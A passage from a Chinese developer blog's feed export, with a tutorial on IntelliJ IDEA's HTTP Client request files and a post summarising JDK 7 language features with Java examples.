        <content type="html"><![CDATA[<h2 id="HTTP-Client-介绍"><a href="#HTTP-Client-介绍" class="headerlink" title="HTTP Client 介绍"></a>HTTP Client 介绍</h2><p>对于 API 测试，常用的方式大多是通过浏览器发送请求、Postman 等 API 工具来测试 API</p><ul><li>Chrome 等浏览器：不方便构造 POST 请求</li><li>Postman：比较专业，但是需要下载工具</li></ul><p>之前对于 API 测试我一直使用等 Postman，便捷、可视化、批量测试，登录后还可以很方便的同步，也可以分享接口到组内或网上</p><p>但是最近才发现原来 IDEA 已经集成了 API 测试工具</p><p>网上查到的很多资料都是 VS Code 里的 <a href="https://segmentfault.com/a/1190000016300254">Editor REST Client</a>，跟 IDEA 的 <a href="https://www.jetbrains.com/help/idea/http-client-in-product-code-editor.html">HTTP Client</a> 类似但还是有些区别的</p><span id="more"></span><p>IDEA 中貌似以前就已经有了 REST Client 工具，但是现在已经提示过时了，会提示使用 <a href="">HTTP Client</a> 来测试 API 了</p><p><img src="http://wx4.sinaimg.cn/large/a6e9cb00ly1g2u4xgxfy1j235s0lik19.jpg" alt="REST Client"></p><p>而新的 HTTP Client 界面是这样的：</p><p><img src="http://wx3.sinaimg.cn/large/a6e9cb00ly1g2us41sv2mj21d30u0qv5.jpg" alt="rest-api.http"></p><h2 id="HTTP-Client-用法"><a href="#HTTP-Client-用法" class="headerlink" title="HTTP Client 用法"></a>HTTP Client 用法</h2><h3 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h3><h4 id="普通-Get-请求"><a href="#普通-Get-请求" class="headerlink" title="普通 Get 请求"></a>普通 Get 请求</h4><pre class="line-numbers language-http" data-language="http"><div class="caption"><span>request</span></div><code class="language-http">GET http://it.yusys.com.cn/yusys/PictureCheckCode.jpeg?nocache={{$timestamp}}<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="POST-Json-请求"><a href="#POST-Json-请求" class="headerlink" title="POST Json 请求"></a>POST Json 请求</h4><pre class="line-numbers language-http" data-language="http"><div class="caption"><span>request</span></div><code class="language-http">POST http://localhost:80/api/item<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span><span class="token application-json"><span class="token punctuation">{</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="POST-表单请求"><a href="#POST-表单请求" class="headerlink" title="POST 表单请求"></a>POST 表单请求</h4><pre class="line-numbers language-http" data-language="http"><div class="caption"><span>request</span></div><code class="language-http">POST http://localhost:80/api/item<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>id=99&amp;content=new-element<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="POST-文本请求"><a href="#POST-文本请求" class="headerlink" title="POST 文本请求"></a>POST 文本请求</h4><pre class="line-numbers language-http" data-language="http"><div class="caption"><span>request</span></div><code class="language-http">POST http://localhost:80/api/item<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=WebAppBoundary</span></span>--WebAppBoundary<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="field-name"</span></span>field-value--WebAppBoundary--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="POST-文件请求"><a href="#POST-文件请求" class="headerlink" title="POST 文件请求"></a>POST 文件请求</h4><pre class="line-numbers language-http" data-language="http"><div class="caption"><span>request</span></div><code class="language-http">POST {{url}}/api/item<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=WebAppBoundary</span></span>--WebAppBoundary<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="field-name"; filename="file.txt"</span></span>&lt; ./relative/path/to/local_file.txt--WebAppBoundary--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="其他请求"><a href="#其他请求" class="headerlink" title="其他请求"></a>其他请求</h4><p>还有其他类型的请求都支持，这里不做详细介绍了</p><ul><li><code>PUT</code> </li><li><code>DELETE</code> </li><li>…</li></ul><h3 id="自定义配置"><a href="#自定义配置" class="headerlink" title="自定义配置"></a>自定义配置</h3><p>有时候同一个 api 有多个环境，尤其开发过程中，有本地、测试、生产的环境，每个环境的地址不一样</p><p>这时候就可以在创建一个配置文件 <code>http-client.env.json</code> 放在与 <code>http</code> 文件相同路径，设置如下：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"development"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://localhost:8080"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"production"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://123.234.6.191"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就可以在请求中使用 <code>{{url}}</code> 来发送不同环境的请求啦</p><p>发送请求时会让你选择 <code>development</code> 还是 <code>production</code></p><p>是不是非常方便？</p><h3 id="动态参数"><a href="#动态参数" class="headerlink" title="动态参数"></a>动态参数</h3><p>HTTP Client 自带几个动态参数，每次运行请求时，动态参数都会生成一个新值:</p><ul><li><code>$uuid</code>: 生成通用唯一标识符（UUID-v4）</li><li><code>$timestamp</code>: 生成当前的 UNIX 时间戳</li><li><code>$randomInt</code>: 生成 0 到 1000 之间的随机整数</li></ul><p>示例见第一个 <code>GET</code> 请求</p><h3 id="请求后执行-JS-脚本"><a href="#请求后执行-JS-脚本" class="headerlink" title="请求后执行 JS 脚本"></a>请求后执行 JS 脚本</h3><p>待续…</p>]]></content>
      
      
      <categories>
          
          <category> 开发工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 效率 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDK 7 新特性</title>
      <link href="/2019/01/27/jdk7newfeatures/"/>
      <url>/2019/01/27/jdk7newfeatures/</url>
      
        <content type="html"><![CDATA[<p>面试的时候面试官问我用的哪个 JDK 版本，然后问我有啥新特性，支支吾吾就答了几个…<br>回来赶紧看看都有啥新特性，查完发现我平时还用了不少呢，有些居然不知道是新特性…好尴尬<br>赶紧复习下…</p><!-- [JDK 8 新特性]()看这里 --><span id="more"></span><h2 id="Switch-语句允许使用-String-类型"><a href="#Switch-语句允许使用-String-类型" class="headerlink" title="Switch 语句允许使用 String 类型"></a>Switch 语句允许使用 String 类型</h2><p>这大概是最直观的修改了，我是挺常用的…</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> test <span class="token operator">=</span> <span class="token string">"a"</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>test<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token string">"a"</span><span class="token operator">:</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"这是字母 a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token string">"b"</span><span class="token operator">:</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"这是字母 b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token string">"c"</span><span class="token operator">:</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"这是字母 c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"不知道这是什么"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="catch-可以一次处理多个异常：将多个异常用同一个-catch-捕获，减少重复代码"><a href="#catch-可以一次处理多个异常：将多个异常用同一个-catch-捕获，减少重复代码" class="headerlink" title="catch 可以一次处理多个异常：将多个异常用同一个 catch 捕获，减少重复代码"></a>catch 可以一次处理多个异常：将多个异常用同一个 catch 捕获，减少重复代码</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// 捕获多个异常</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> <span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="try-可以自动关闭资源"><a href="#try-可以自动关闭资源" class="headerlink" title="try 可以自动关闭资源"></a>try 可以自动关闭资源</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">BufferedReader</span> br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">return</span> br<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上代码等同于：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">BufferedReader</span> br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> br<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>br <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>        br<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>只有实现了 <code>java.lang.AutoCloseable</code> 接口，或者 <code>java.io.Closable</code>（实际上继随自 <code>java.lang.AutoCloseable</code>）接口的对象，才会自动调用其 <code>close()</code> 函数。</p></blockquote><p>关于 <code>java.lang.AutoCloseable</code> 与 <code>java.io.Closable</code> 的官方解释如下：</p><ul><li>AutoClosable:<ul><li>关闭此资源，放弃任何基础资源。这个方法在 <code>try-with-resources</code> 语句管理的对象上自动调用。</li><li>虽然声明此接口方法抛出异常，但强烈建议实现者声明 <code>close</code> 方法的具体实现以抛出更具体的异常，或者如果关闭操作不能失败则不抛出任何异常。</li><li>强烈建议此接口的实现者不要使用 <code>close</code> 方法抛出 <code>InterruptedException</code>。此异常与线程的中断状态交互，如果抑制 <code>InterruptedException</code>，则可能发生运行时错误行为。更一般地说，如果它会导致异常被抑制的问题，<code>AutoCloseable.close</code> 方法不应该抛出它。</li><li>请注意，与 <code>Closeable</code> 的 <code>close</code> 方法不同，此 <code>close</code> 方法不需要是<strong>幂等</strong>的。换句话说，不止一次调用此 <code>close</code> 方法可能会产生一些可见的副作用，这与 <code>Closeable.close</code> 不同，如果多次调用则需要它无效。但是，强烈建议强制使用此接口的实现者使其 <code>close</code> 方法具有幂等性。</li><li>Exception - if this resource cannot be closed</li></ul></li><li>Closable:<ul><li>关闭此流并释放与之关联的任何系统资源。如果流已经关闭，则调用此方法无效。</li><li>IOException - if an I/O error occurs</li></ul></li></ul><blockquote><p>幂等：同样的请求被执行一次与连续执行多次的效果是一样的 <code>f(f(x)) = f(x)</code></p></blockquote><h2 id="支持数字常量和二进制常量中使用下划线"><a href="#支持数字常量和二进制常量中使用下划线" class="headerlink" title="支持数字常量和二进制常量中使用下划线"></a>支持数字常量和二进制常量中使用下划线</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">long</span> creditCardNumber <span class="token operator">=</span> <span class="token number">1234_5678_9012_3456L</span><span class="token punctuation">;</span><span class="token comment">// 等同于 long creditCardNumber = 1234567890123456L;</span><span class="token keyword">long</span> socialSecurityNumber <span class="token operator">=</span> <span class="token number">999_99_9999L</span><span class="token punctuation">;</span><span class="token comment">// 等同于 long socialSecurityNumber = 999999999L;</span><span class="token keyword">float</span> pi <span class="token operator">=</span> <span class="token number">3.14_15F</span><span class="token punctuation">;</span><span class="token comment">// 等同于 float pi = 3.1415F;</span><span class="token keyword">long</span> hexBytes <span class="token operator">=</span> <span class="token number">0xFF_EC_DE_5E</span><span class="token punctuation">;</span><span class="token comment">// 等同于 long hexBytes = 0xFFECDE5E; 或 long hexBytes = 4293713502L;</span><span class="token keyword">long</span> hexWords <span class="token operator">=</span> <span class="token number">0xCAFE_BABE</span><span class="token punctuation">;</span><span class="token comment">// 同上</span><span class="token keyword">long</span> maxLong <span class="token operator">=</span> <span class="token number">0</span>x7fff_ffff_ffff_ffffL<span class="token punctuation">;</span><span class="token comment">//同上</span><span class="token keyword">byte</span> nybbles <span class="token operator">=</span> <span class="token number">0b0010_0101</span><span class="token punctuation">;</span><span class="token comment">// 等同于 byte nybbles = ob0010_0101; 或 byte nybbles = 37;</span><span class="token keyword">long</span> bytes <span class="token operator">=</span> <span class="token number">0b11010010_01101001_10010100_10010010</span><span class="token punctuation">;</span><span class="token comment">//float pi1 = 3_.1415F;// 无效;不能将下划线放在小数点附近  </span><span class="token comment">//float pi2 = 3._1415F;// 无效;不能将下划线放在小数点附近 </span><span class="token comment">//long socialSecurityNumber1= 999_99_9999_L;// 无效;在 L 后缀之前不能加下划线</span><span class="token comment">//int x1 = _52;// 这是一个标识符，而不是数字文字  </span><span class="token keyword">int</span> x2 <span class="token operator">=</span> <span class="token number">5_2</span><span class="token punctuation">;</span><span class="token comment">// 等同于 int x2 = 52;</span><span class="token comment">//int x3 = 52_;// 无效;不能将下划线放在文字的末尾</span><span class="token keyword">int</span> x4 <span class="token operator">=</span> <span class="token number">5_______2</span><span class="token punctuation">;</span><span class="token comment">// 等同于 innt x4 = 52</span><span class="token comment">//int x5 = 0_x52;// 无效;不能将下划线放在 0x 基数前缀中</span><span class="token comment">//int x6 = 0x_52;// 无效;不能将下划线放在数字的开头</span><span class="token keyword">int</span> x7 <span class="token operator">=</span> <span class="token number">0x5_2</span><span class="token punctuation">;</span><span class="token comment">// 等同于 int x7 = 0x52; 或 int x7 = 82;</span><span class="token comment">//int x8 = 0x52_;// 无效;不能将下划线放在数字的末尾</span><span class="token keyword">int</span> x9 <span class="token operator">=</span> <span class="token number">0_52</span><span class="token punctuation">;</span><span class="token comment">// 等同于 int x9 = 52;</span><span class="token keyword">int</span> x10 <span class="token operator">=</span> <span class="token number">05_2</span><span class="token punctuation">;</span><span class="token comment">// 等同于 int x10 = 52</span><span class="token comment">//int x11 = 052_;// 无效;不能将下划线放在数字的末尾</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="支持将整数类型用二进制表示，用-0b-或-0B-开头"><a href="#支持将整数类型用二进制表示，用-0b-或-0B-开头" class="headerlink" title="支持将整数类型用二进制表示，用 0b 或 0B 开头"></a>支持将整数类型用二进制表示，<strong>用 <code>0b</code> 或 <code>0B</code> 开头</strong></h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span> b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token number">0b0010_0010</span><span class="token punctuation">;</span><span class="token comment">// 等同于 byte b = 34;</span><span class="token keyword">short</span> s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span>ob1010_0001_0100_0101<span class="token punctuation">;</span><span class="token comment">// 等同于 short s = 41285;</span><span class="token keyword">int</span> i1 <span class="token operator">=</span> <span class="token number">0b1010_0001_0100_0101_1010_0001_0100_0101</span><span class="token punctuation">;</span><span class="token comment">// 等同于 int i1 = 2705695045;</span><span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0B101</span><span class="token punctuation">;</span><span class="token comment">// 等同于 int i2 = 5;</span><span class="token comment">// 注意 long 类型要以 'L' 结尾，不推荐使用 'l'</span><span class="token keyword">long</span> l <span class="token operator">=</span> <span class="token number">0b1010_0001_0100_0101_1010_0001L</span><span class="token punctuation">;</span><span class="token comment">// 等同于 long l = 10569121L;</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0b10</span><span class="token punctuation">,</span> <span class="token number">0B101</span><span class="token punctuation">,</span> <span class="token number">0b110</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">// 等同于 int[] arr = {2, 5, 6};</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="简化泛型实例的创建代码"><a href="#简化泛型实例的创建代码" class="headerlink" title="简化泛型实例的创建代码"></a>简化泛型实例的创建代码</h2><p>创建泛型实例时可以去掉后面 new 部分的泛型类型</p><h3 id="JDK-7-优化前"><a href="#JDK-7-优化前" class="headerlink" title="JDK 7 优化前"></a>JDK 7 优化前</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span> strList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> strList4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Map</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> strList5 <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Map</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="JDK-7-优化后——编译器使用尖括号-lt-gt-推断类型"><a href="#JDK-7-优化后——编译器使用尖括号-lt-gt-推断类型" class="headerlink" title="JDK 7 优化后——编译器使用尖括号 <> 推断类型"></a>JDK 7 优化后——编译器使用尖括号 <code>&lt;&gt;</code> 推断类型</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> strList0 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Map</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> strList1 <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Map</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> strList2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Map</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> strList3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//list.addAll(new ArrayList&lt;&gt;());// 这里需要添加泛型类型</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="改进编译警告和错误"><a href="#改进编译警告和错误" class="headerlink" title="改进编译警告和错误"></a>改进编译警告和错误</h2><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span> l <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Number</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> ls <span class="token operator">=</span> l<span class="token punctuation">;</span><span class="token comment">// 未经检查的警告</span>l<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 另一个未经检查的警告</span><span class="token class-name">String</span> s <span class="token operator">=</span> ls<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 抛出 ClassCastException 异常</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例 2:"></a>示例 2:</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token keyword">void</span> addToList <span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> listArg<span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> elements<span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">T</span> x <span class="token operator">:</span> elements<span class="token punctuation">)</span> <span class="token punctuation">{</span>     listArg<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在可变参数方法中传递非具体化参数，你会得到一个警告：</p><blockquote><p>warning: [varargs] Possible heap pollution from parameterized vararg type.</p></blockquote><p>要消除警告，可以有三种方式:</p><ol><li>加 annotation <code>@SafeVarargs</code></li><li>加 annotation <code>@SuppressWarnings({"unchecked", "varargs"})</code></li><li>使用编译器参数 <code>–Xlint:varargs;</code></li></ol><h2 id="新增-ThreadLocalRandom-类"><a href="#新增-ThreadLocalRandom-类" class="headerlink" title="新增 ThreadLocalRandom 类"></a>新增 ThreadLocalRandom 类</h2><p>ThreadLocalRandom 继承自 Random</p><blockquote><p>A random number generator isolated to the current thread. Like the global Random generator used by the Math class, a ThreadLocalRandom is initialized with an internally generated seed that may not otherwise be modified. When applicable, use of ThreadLocalRandom rather than shared Random objects in concurrent programs will typically encounter much less overhead and contention. Use of ThreadLocalRandom is particularly appropriate when multiple tasks (for example, each a ForkJoinTask) use random numbers in parallel in thread pools.</p><p>Usages of this class should typically be of the form: ThreadLocalRandom.current().nextX(…) (where X is Int, Long, etc). When all usages are of this form, it is never possible to accidently share a ThreadLocalRandom across multiple threads.</p><p>This class also provides additional commonly used bounded random generation methods.</p></blockquote><p>随机数生成器被隔离到当前线程。与 Math 类使用的全局 Random 生成器一样，ThreadLocalRandom 使用内部生成的种子进行初始化，否则可能无法修改。适用时，在并发程序中使用 ThreadLocalRandom 而不是共享 Random 对象通常会遇到更少的开销和争用。当多个任务（例如，每个 ForkJoinTask）在线程池中并行使用随机数时，使用 ThreadLocalRandom 是特别合适的。</p><p>此类的用法通常应为以下形式: <code>ThreadLocalRandom.current().nextX(...)</code>(其中 X 为 Int, Long 等)。当所有用法都是这种形式时，永远不可能在多个线程中意外地共享 ThreadLocalRandom。</p><p>该类还提供了其他常用的有界随机生成方法。</p><blockquote><p>实际上就是使用 threadlocal 保证并发下的随机数生成的线程安全</p></blockquote><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ul><li>current<ul><li>public static ThreadLocalRandom current()</li><li>Returns: 当前线程的 ThreadLocalRandom</li></ul></li><li>setSeed<ul><li>public void setSeed(long seed)</li><li>Overrides: Random 类的 setSeed 